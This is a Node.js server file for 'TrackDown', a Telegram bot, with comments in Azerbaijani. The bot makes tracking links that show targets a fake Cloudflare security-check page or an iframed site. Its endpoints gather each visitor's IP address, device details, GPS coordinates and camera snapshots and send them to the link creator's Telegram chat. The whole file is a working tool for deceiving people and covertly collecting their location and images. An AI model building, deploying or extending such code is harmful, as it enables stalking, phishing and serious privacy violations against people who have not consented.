/**
 * ============================================================
 *  TrackDown — Ana Server
 *  Dəstəklənən: Railway · Render · Heroku · Fly.io · Replit · VPS
 * ============================================================
 */

const config      = require('./config');
const fs          = require('fs');
const path        = require('path');
const express     = require('express');
const cors        = require('cors');
const bp          = require('body-parser');
const fetch       = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

// ═══════════════════════════════════════════════════════════
//  YARDIMÇI FUNKSİYALAR
// ═══════════════════════════════════════════════════════════

// URL-safe base64 — + → - | / → _ | = silinir
// Standart base64-dakı "/" simvolu URL-i qırırdı, buna görə base64url istifadə edirik
function b64Encode(str) {
  return Buffer.from(str, 'utf8')
    .toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g,  '');
}

function b64Decode(str) {
  // base64url → standard base64
  let s = str.replace(/-/g, '+').replace(/_/g, '/');
  while (s.length % 4) s += '=';
  return Buffer.from(s, 'base64').toString('utf8');
}

// Client IP-ni düzgün al (proxy arxasında da işləyir)
function getClientIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) return forwarded.split(',')[0].trim();
  return req.connection?.remoteAddress || req.ip || '';
}

// Request-dən host URL-i qur (Nginx / Cloudflare / Railway proxy üçün)
function buildHostFromReq(req) {
  const proto = (req.headers['x-forwarded-proto'] || req.protocol || 'https')
    .split(',')[0].trim();
  const host  = req.headers['x-forwarded-host'] || req.headers.host || '';
  return host ? `${proto}://${host}` : null;
}

// Aktiv host URL-i qaytar (statik > runtime > null)
function getHostURL(req) {
  if (config.STATIC_HOST) return config.STATIC_HOST;
  return buildHostFromReq(req);
}

// Medya növünü aşkarla
function getMediaType() {
  const dir = path.join(__dirname, 'view');
  if (fs.existsSync(path.join(dir, 'photo.png')))   return 'photo';
  if (fs.existsSync(path.join(dir, 'video.mp4')))   return 'video';
  if (fs.existsSync(path.join(dir, 'animate.gif'))) return 'gif';
  return 'none';
}

// ═══════════════════════════════════════════════════════════
//  RUNTIME HOST TRACKER
//  Bot linklər yaradanda req yoxdur — buna görə ilk gəlmiş
//  real request-dən alınan host-u saxlayırıq
// ═══════════════════════════════════════════════════════════
let runtimeHost = config.STATIC_HOST || null;

function updateRuntimeHost(req) {
  if (runtimeHost) return; // artıq var
  const url = buildHostFromReq(req);
  if (!url || url.includes('localhost') || url.includes('127.0.0.1')) return;
  runtimeHost = url;
  console.log(`🌐  Host URL avtomatik müəyyən edildi: ${runtimeHost}`);
}

// ═══════════════════════════════════════════════════════════
//  EXPRESS QURAŞDIRMASI
// ═══════════════════════════════════════════════════════════
const app = express();
app.use(bp.json({ limit: '20mb', type: 'application/json' }));
app.use(bp.urlencoded({ extended: true, limit: '20mb' }));
app.use(cors());
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'view'));
app.use('/static', express.static(path.join(__dirname, 'view')));

// ── Trust proxy (Nginx, Railway, Render, Heroku, Cloudflare)
app.set('trust proxy', true);

// ── Hər request-də runtimeHost-u güncəllə
app.use((req, _res, next) => { updateRuntimeHost(req); next(); });

const USE_SHORTENER = false;

// ═══════════════════════════════════════════════════════════
//  ROUTES
// ═══════════════════════════════════════════════════════════

// Webview linki
app.get('/w/:uid/:uri', (req, res) => {
  const { uid, uri } = req.params;
  if (!uid) return res.redirect('https://t.me/th30neand0nly0ne');

  let targetUrl;
  try { targetUrl = b64Decode(uri); } catch (_) { return res.status(400).send('Yanlış link'); }

  res.render('webview', {
    ip:        getClientIP(req),
    time:      new Date().toJSON().slice(0, 19).replace('T', ' '),
    url:       targetUrl,
    uid,
    a:         getHostURL(req),
    t:         USE_SHORTENER,
    mediaType: getMediaType()
  });
});

// Cloudflare linki
app.get('/c/:uid/:uri', (req, res) => {
  const { uid, uri } = req.params;
  if (!uid) return res.redirect('https://t.me/th30neand0nly0ne');

  let targetUrl;
  try { targetUrl = b64Decode(uri); } catch (_) { return res.status(400).send('Yanlış link'); }

  res.render('cloudflare', {
    ip:        getClientIP(req),
    time:      new Date().toJSON().slice(0, 19).replace('T', ' '),
    url:       targetUrl,
    uid,
    a:         getHostURL(req),
    t:         USE_SHORTENER,
    mediaType: getMediaType()
  });
});

// Ana səhifə
app.get('/', (req, res) => {
  res.json({ status: 'TrackDown aktiv', ip: getClientIP(req) });
});

// ═══════════════════════════════════════════════════════════
//  DATA TOPLAMA ENDPOINTLƏR
// ═══════════════════════════════════════════════════════════

// Cihaz məlumatları
app.post('/', (req, res) => {
  const uid  = decodeURIComponent(req.body.uid  || '');
  const data = decodeURIComponent(req.body.data || '');
  const ip   = getClientIP(req);

  if (!uid || !data || !data.includes(ip)) return res.send('ok');

  bot.sendMessage(parseInt(uid, 36), data.replaceAll('<br>', '\n'), { parse_mode: 'HTML' })
     .catch(() => {});
  res.send('Done');
});

// GPS məkanı
app.post('/location', (req, res) => {
  const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  const uid = decodeURIComponent(req.body.uid) || null;
  const acc = decodeURIComponent(req.body.acc) || null;

  if (!lat || !lon || !uid) return res.send('ok');

  const chatId = parseInt(uid, 36);
  bot.sendLocation(chatId, lat, lon).catch(() => {});
  bot.sendMessage(chatId, `📍 GPS Məkanı\nEnlik: ${lat}\nUzunluq: ${lon}\nDəqiqlik: ${acc} metr`).catch(() => {});
  res.send('Done');
});

// Kamera snapshotu
app.post('/camsnap', (req, res) => {
  const uid = decodeURIComponent(req.body.uid || '');
  const img = decodeURIComponent(req.body.img || '');

  if (!uid || !img) return res.send('ok');

  const buffer = Buffer.from(img, 'base64');
  bot.sendPhoto(parseInt(uid, 36), buffer, {}, { filename: 'camsnap.png', contentType: 'image/png' })
     .catch(err => console.error('Kamera xətası:', err.message));
  res.send('Done');
});

// ═══════════════════════════════════════════════════════════
//  TELEGRAM BOT
// ═══════════════════════════════════════════════════════════
const bot = new TelegramBot(config.TOKEN, { polling: true });

// ── /66 ADMIN MODULE (mövcud koda toxunmur) ──
require('./admin')(app, bot, () => runtimeHost);


bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg?.reply_to_message?.text === '🌐 Enter Your URL') {
    return createLink(chatId, msg.text);
  }

  switch (msg.text) {

    case '/start': {
      const caption =
        `◈ 𝐓𝐇𝐄 𝐋𝐈𝐅𝐄 𝐈𝐒 𝐍𝐎𝐓 𝐅𝐀𝐈𝐑 ◈\n` +
        `◈ 𝐘𝐎𝐔 𝐒𝐇𝐎𝐔𝐋𝐃 𝐍𝐎𝐓 𝐁𝐄 𝐀 𝐅𝐀𝐈𝐑 ◈\n` +
        `▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n` +
        `⚓ 𝘽𝙤𝙩 𝘾𝙧𝙚𝙖𝙩𝙚𝙙 𝙗𝙮 𝙊𝙍𝙐𝙅𝙊𝙑 ⚓\n\n` +
        `Başlamaq üçün /create yazın.`;

      const markup = {
        reply_markup: JSON.stringify({
          inline_keyboard: [[{ text: '🔗 Link Yarat', callback_data: 'crenew' }]]
        })
      };

      const imgPath = path.join(__dirname, 'bot', 'bot.png');
      if (fs.existsSync(imgPath)) {
        bot.sendPhoto(chatId, imgPath, { caption, ...markup });
      } else {
        bot.sendMessage(chatId, `Xoş gəldiniz, ${msg.chat.first_name}!\n\n${caption}`, markup);
      }
      break;
    }

    case '/create':
      createNew(chatId);
      break;

    case '/help':
      bot.sendMessage(chatId,
        `ℹ️ *TrackDown — Yardım*\n\n` +
        `Bu bot izləmə linki yaratmağa kömək edir.\n\n` +
        `*Addımlar:*\n` +
        `1️⃣ /create yazın\n` +
        `2️⃣ Hədəfə göstərmək istədiyiniz URL-i göndərin\n` +
        `3️⃣ 2 izləmə linki alacaqsınız\n\n` +
        `*Link növləri:*\n` +
        `🔵 *Cloudflare* — Saxta təhlükəsizlik yoxlama ekranı\n` +
        `🟢 *Webview* — Seçdiyiniz saytı iframe ilə göstərir\n\n` +
        `*Toplanan məlumatlar:*\n` +
        `• IP ünvanı və ISP\n` +
        `• Cihaz / brauzer məlumatları\n` +
        `• GPS koordinatları (icazə verilsə)\n` +
        `• Kamera şəkli (icazə verilsə)`,
        { parse_mode: 'Markdown' }
      );
      break;
  }
});

bot.on('callback_query', (cbq) => {
  bot.answerCallbackQuery(cbq.id);
  if (cbq.data === 'crenew') createNew(cbq.message.chat.id);
});

bot.on('polling_error', (err) => {
  // 409 — köhnə instansiya hələ bağlanmayıb, özü həll olur
  if (err.code === 'ETELEGRAM' && err.message.includes('409')) return;
  console.error(`❌ Telegram xətası: [${err.code}] ${err.message}`);
});

// ── Link yaratma ───────────────────────────────────────────

function createNew(cid) {
  bot.sendMessage(cid, '🌐 Enter Your URL', {
    reply_markup: JSON.stringify({ force_reply: true })
  });
}

async function createLink(cid, text) {
  const isURL     = /^https?:\/\/.+/i.test(text.trim());
  const hasUnicode = [...text].some(c => c.charCodeAt(0) > 127);

  if (!isURL || hasUnicode) {
    await bot.sendMessage(cid, '⚠️ Zəhmət olmasa https:// ilə başlayan düzgün URL göndərin.');
    return createNew(cid);
  }

  // Host URL müəyyənləşdir
  const host = runtimeHost;
  if (!host) {
    return bot.sendMessage(cid,
      '⚠️ *Host URL hələ müəyyən edilməyib.*\n\n' +
      'Həll yolu:\n' +
      '`bot.js` faylında domain sahəsini doldurun:\n' +
      '`domain: "https://sizin-site.com"`\n\n' +
      'Dəyişiklikdən sonra serveri yenidən başladın.',
      { parse_mode: 'Markdown' }
    );
  }

  const uid  = cid.toString(36);
  const enc  = b64Encode(text.trim());
  const cUrl = `${host}/c/${uid}/${enc}`;
  const wUrl = `${host}/w/${uid}/${enc}`;

  const markup = {
    reply_markup: JSON.stringify({
      inline_keyboard: [[{ text: '🔗 Yeni Link Yarat', callback_data: 'crenew' }]]
    })
  };

  bot.sendChatAction(cid, 'typing');

  if (USE_SHORTENER) {
    try {
      const [rx, ry] = await Promise.all([
        fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(r => r.json()),
        fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(r => r.json())
      ]);
      return bot.sendMessage(cid,
        `✅ *Linklər hazırdır!*\n🔗 URL: ${text}\n\n` +
        `🔵 *Cloudflare*\n${Object.values(rx).join('\n')}\n\n` +
        `🟢 *Webview*\n${Object.values(ry).join('\n')}`,
        { parse_mode: 'Markdown', ...markup }
      );
    } catch (_) {
      // qısaltma uğursuz — uzun linkləri göndər
    }
  }

  bot.sendMessage(cid,
    `✅ *Linklər hazırdır!*\n` +
    `🔗 URL: ${text}\n\n` +
    `🔵 *Cloudflare Link*\n${cUrl}\n\n` +
    `🟢 *Webview Link*\n${wUrl}`,
    { parse_mode: 'Markdown', ...markup }
  );
}

// ═══════════════════════════════════════════════════════════
//  SERVER BAŞLAT
// ═══════════════════════════════════════════════════════════
app.listen(config.PORT, () => {
  console.log(`🚀  Server işləyir — Port: ${config.PORT}`);
});
